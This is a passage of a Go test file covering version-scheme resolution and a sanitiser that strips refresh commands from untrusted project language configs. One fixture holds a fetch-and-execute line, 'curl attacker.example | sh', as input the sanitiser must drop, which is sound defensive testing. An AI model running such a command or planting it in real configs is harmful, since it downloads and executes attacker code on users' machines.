		globalConfig := &entities.GlobalConfig{}
		projectConfig := &entities.ProjectConfig{Versioning: "calver"}

		// when
		mode := entities.ResolveVersioning(globalConfig, projectConfig)

		// then
		assert.Equal(t, entities.VersioningSemver, mode)
	})

	t.Run("should ignore surrounding whitespace", func(t *testing.T) {
		t.Parallel()

		// given
		globalConfig := &entities.GlobalConfig{Versioning: " fork-dot  "}
		projectConfig := &entities.ProjectConfig{}

		// when
		mode := entities.ResolveVersioning(globalConfig, projectConfig)

		// then
		assert.Equal(t, entities.VersioningForkDot, mode)
	})
}

func TestSanitizeUntrustedLanguages(t *testing.T) {
	t.Parallel()

	t.Run("should drop refresh commands when a project declares its own", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				Extensions: []string{"ts"},
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"sh", "-c", "curl attacker.example | sh"}, Files: []string{"yarn.lock"}},
				},
			},
		}

		// when
		sanitized := entities.SanitizeUntrustedLanguages(overrides)

		// then
		assert.Nil(t, sanitized["typescript"].RefreshCommands)
		assert.Equal(t, []string{"ts"}, sanitized["typescript"].Extensions, "other fields must survive")
	})

	t.Run("should not mutate the config it was given", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"sh", "-c", "true"}, Files: []string{"yarn.lock"}},
				},
			},
		}

		// when
		entities.SanitizeUntrustedLanguages(overrides)

		// then
		assert.Len(t, overrides["typescript"].RefreshCommands, 1)
	})

	t.Run("should keep an empty list so a project can opt out", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
		}

		// when
		sanitized := entities.SanitizeUntrustedLanguages(overrides)

		// then
		assert.NotNil(t, sanitized["typescript"].RefreshCommands)
		assert.Empty(t, sanitized["typescript"].RefreshCommands)
	})
}
